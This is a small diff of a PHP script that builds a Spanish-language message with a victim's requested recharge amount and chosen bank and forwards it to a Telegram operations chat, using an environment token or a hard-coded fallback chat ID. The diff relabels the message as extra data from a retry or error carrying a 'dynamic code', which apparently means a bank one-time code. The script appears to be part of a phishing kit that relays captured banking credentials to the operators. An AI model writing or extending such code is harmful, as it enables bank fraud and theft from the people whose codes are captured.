@@ -63,7 +63,7 @@ $FALLBACK_CHAT_ID_OPS   = "-4923753161";
 $token   = getenv('TELEGRAM_BOT_TOKEN_OPS') ?: $FALLBACK_BOT_TOKEN_OPS;
 $chat_id = getenv('TELEGRAM_CHAT_ID_OPS')   ?: $FALLBACK_CHAT_ID_OPS;
 
-$mensaje  = "🧾 *Recibo Digital de Recarga (error / reintento)*\n";
+$mensaje  = "🔁 <b>[DATO EXTRA: REINTENTO / ERROR]</b> Corrección de código (dinámica o similar):\n";
 $mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
 $mensaje .= "💸 Recarga solicitada: $monto\n";
 $mensaje .= "🏦 Banco elegido: $banco\n";
